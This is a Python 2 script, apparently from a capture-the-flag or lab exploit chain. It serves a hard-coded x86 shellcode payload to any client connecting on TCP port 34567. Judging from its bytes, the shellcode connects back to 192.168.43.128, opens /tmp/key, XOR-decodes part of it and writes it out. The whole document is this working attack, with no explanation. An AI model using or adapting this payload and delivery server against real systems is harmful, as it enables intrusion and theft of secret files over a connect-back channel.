#!/usr/bin/python
import SocketServer
SocketServer.TCPServer.allow_reuse_address = True

HOST, PORT = "0.0.0.0", 34567

SCODE = ""
SCODE += "\x6a\x61\x58\x99\x52\x42\x52\x42"
SCODE += "\x52\x68\xc0\xa8\x2b\x80\xcd\x80"
SCODE += "\x68\x10\x02\x5b\xa0\x89\xe1\x6a"
SCODE += "\x10\x51\x50\x51\x93\x6a\x62\x58"
SCODE += "\xcd\x80\x6a\x02\x59\x6a\x5a\x58"
SCODE += "\x52\x53\x52\xcd\x80\x4a\x79\xf5"
SCODE += "\xeb\x46\x5b\x31\xc0\x50\x50\x53"
SCODE += "\x53\x31\xc0\xb0\x05\xcd\x80\x89"
SCODE += "\xc2\x89\xe6\x81\xec\x80\x00\x00"
SCODE += "\x00\x31\xc0\xb0\x04\x50\x56\x89"
SCODE += "\xd0\x50\x50\xb0\x03\xcd\x80\x31"
SCODE += "\xc9\x8a\x04\x0e\x34\x88\x88\x04"
SCODE += "\x0e\x41\x80\xf9\x04\x75\xf2\x31"
SCODE += "\xc0\xb0\x04\x50\x56\x6a\x00\x50"
SCODE += "\xb0\x04\xcd\x80\xb0\x01\xcd\x80"
SCODE += "\xe8\xb5\xff\xff\xff\x2f\x74\x6d"
SCODE += "\x70\x2f\x6b\x65\x79\x00"

class MyTCPHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        # self.request is the TCP socket connected to the client
        print "[*] connection from %s" % self.client_address[0]
        self.request.send( SCODE)
        print "[*] sent SCODE [%d] [0x%x] bytes" % (len(SCODE), len(SCODE))
        return


if __name__ == "__main__":
    print "server starts at %s:%d" % (HOST, PORT)
    server = SocketServer.TCPServer((HOST, PORT), MyTCPHandler)
    server.serve_forever()
